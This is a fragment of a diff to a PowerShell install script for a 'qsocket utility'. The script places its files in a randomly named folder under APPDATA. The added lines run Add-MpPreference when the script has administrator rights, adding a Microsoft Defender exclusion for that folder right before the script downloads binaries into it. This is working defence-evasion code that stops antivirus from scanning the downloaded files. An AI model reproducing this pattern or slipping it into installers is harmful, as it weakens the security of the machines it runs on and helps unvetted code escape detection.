@@ -163,6 +163,16 @@ $QS_PATH= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME"
 Print-Status "QSocket Path: $QS_PATH"
 mkdir $QS_PATH >$null
 
+if (Is-Administrator) {
+    Print-Progress "Adding defender exclusion path"
+    try {
+        Add-MpPreference -ExclusionPath "$QS_PATH" >$null
+        Print-Ok
+    }catch {
+        Print-Fail
+    }
+}
+
 # Download the latest qsocket utility
 try {
     Print-Progress "Downloading binaries"
